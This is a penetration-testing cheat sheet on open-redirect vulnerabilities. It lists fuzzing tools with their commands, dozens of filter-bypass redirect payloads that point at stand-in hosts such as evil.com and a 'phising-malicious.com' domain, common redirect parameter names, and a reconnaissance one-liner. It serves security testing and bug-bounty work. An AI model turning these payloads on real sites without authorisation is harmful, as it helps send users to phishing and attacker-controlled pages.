# Open redirects

## Tools

```bash
#https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

#https://github.com/0xNanda/Oralyzer
python3 oralyzer.py -u https://website.com/redir?url=

# Payload generator
# https://gist.github.com/zPrototype/b211ae91e2b082420c350c28b6674170
```

## Payloads

```bash
# Check for
=aHR0
=http
# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt

https://web.com/r/?url=https://phising-malicious.com
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect

# Check redirects
https://url.com/redirect/?url=http://twitter.com/
http://www.theirsite.com@yoursite.com/
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
/http://twitter.com/
/\\twitter.com
/\/twitter.com
?c=.twitter.com/
/?redir=google。com
//google%E3%80%82com
//google%00.com
/%09/google.com
/%5cgoogle.com
//www.google.com/%2f%2e%2e
//www.google.com/%2e%2e
//google.com/
//google.com/%2f..
//\google.com
/\victim.com:80%40google.com
https://target.com///google.com//
# Remember url enconde the payloads!

# Search in Burp:
“=http” or “=aHR0”（base64 encode http）

# Fuzzing openredirect

# Intruder url open redirect
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}

# Valid URLs:
http(s)://evil.com
http(s):\\evil.com
//evil.com
///evil.com
/\evil.com
\/evil.com
/\/evil.com
\\evil.com
\/\evil.com
/ /evil.com
\ \evil.com

# Oneliner with gf
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

